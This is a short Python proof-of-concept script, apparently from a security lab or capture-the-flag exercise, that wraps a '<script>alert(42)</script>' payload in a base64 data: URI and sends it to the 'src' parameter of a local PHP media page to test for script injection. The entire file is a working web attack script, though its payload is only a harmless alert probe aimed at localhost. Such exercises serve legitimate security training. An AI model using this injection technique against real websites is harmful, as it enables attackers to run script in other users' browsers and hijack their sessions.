import requests
import base64

def main():
	payload = "<script>alert(42)</script>"
	payload = base64.b64encode(payload.encode()).decode()
	payload = f"data:text/html;base64,{payload}"
	response = requests.get(f"http://localhost:8080/index.php?page=media&src={payload}")
	print(response.text)

if __name__ == "__main__":
	main()